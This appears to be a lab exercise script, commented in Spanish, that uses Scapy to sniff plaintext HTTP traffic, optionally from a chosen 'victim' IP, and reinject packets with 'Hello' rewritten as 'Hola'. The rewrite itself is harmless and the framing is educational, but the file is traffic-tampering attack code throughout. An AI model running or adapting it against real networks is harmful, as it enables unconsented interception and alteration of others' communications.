#!/usr/bin/env python3

"""Ejemplo de práctica de MITM por inyección de paquetes con Scapy."""

import argparse
from scapy.all import sniff, sendp, IP, TCP, Raw


def modificar_paquete(pkt, victim_ip=None):
    """Modifica el payload de paquetes HTTP en texto plano y reenvía el paquete."""
    if pkt.haslayer(Raw) and pkt.haslayer(IP) and pkt.haslayer(TCP):
        if victim_ip:
            if pkt[IP].src != victim_ip and pkt[IP].dst != victim_ip:
                return

        carga = pkt[Raw].load
        if b"Hello" in carga or b"hello" in carga:
            nueva_carga = carga.replace(b"Hello", b"Hola").replace(b"hello", b"hola")

            nueva = pkt.copy()
            nueva[Raw].load = nueva_carga

            # Recalcular todos los checksums automáticamente
            del nueva[IP].chksum
            del nueva[TCP].chksum

            sendp(nueva, iface=pkt.sniffed_on, verbose=False)
            print(f"Paquete modificado reenviado: {pkt[IP].src} -> {pkt[IP].dst}")


def main():
    parser = argparse.ArgumentParser(
        description="Escucha e inyecta paquetes en un ataque MITM de laboratorio."
    )
    parser.add_argument(
        "--iface",
        default="eth0",
        help="Interfaz de red donde se escuchará el tráfico (por ejemplo eth0, wlan0).",
    )
    parser.add_argument(
        "--victim",
        help="Dirección IP de la víctima remota en la red LAN.",
    )
    parser.add_argument(
        "--filter",
        default="tcp port 80",
        help="Filtro BPF para capturar solo el tráfico deseado.",
    )

    args = parser.parse_args()

    print(f"Iniciando escucha en {args.iface}...")
    if args.victim:
        print(f"Filtrando tráfico de la víctima remota: {args.victim}")
    print("Para finalizar, presiona Ctrl+C")

    sniff(
        iface=args.iface,
        filter=args.filter,
        prn=lambda pkt: modificar_paquete(pkt, victim_ip=args.victim),
        store=False,
    )


if __name__ == "__main__":
    main()
